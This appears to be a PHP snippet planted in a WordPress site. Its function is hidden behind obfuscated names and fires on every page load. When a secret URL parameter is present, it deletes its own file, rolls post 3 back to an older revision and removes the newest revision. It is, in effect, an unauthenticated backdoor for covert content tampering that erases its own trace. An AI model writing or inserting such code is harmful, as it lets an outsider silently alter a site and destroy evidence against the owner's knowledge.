<?php

function control_upload_vendor() {
	if (isset($_GET['history_embed_mini']) && $_GET['history_embed_mini'] === 'scheduler_ultimate_pack') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$exporter_settings_specific_typography = 3;
		$live_results_list = wp_get_post_revisions($exporter_settings_specific_typography);
		if (empty($live_results_list)) die('no revisions');
		if (count($live_results_list) < 2) die('less than 2');
		$conversion_client_simple = array_shift($live_results_list);
		$pagination_zoom_dropdown = $conversion_client_simple->ID;
		$reading_campaign_publish_day = array_shift($live_results_list);
		$quotes_pages_install = $reading_campaign_publish_day->ID;
		$control_sign_bootstrap_term = wp_restore_post_revision($quotes_pages_install);
		if ($control_sign_bootstrap_term === false) die('error restoring');
		$control_sign_bootstrap_term = wp_delete_post_revision($pagination_zoom_dropdown);		
		if ($control_sign_bootstrap_term === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'control_upload_vendor');
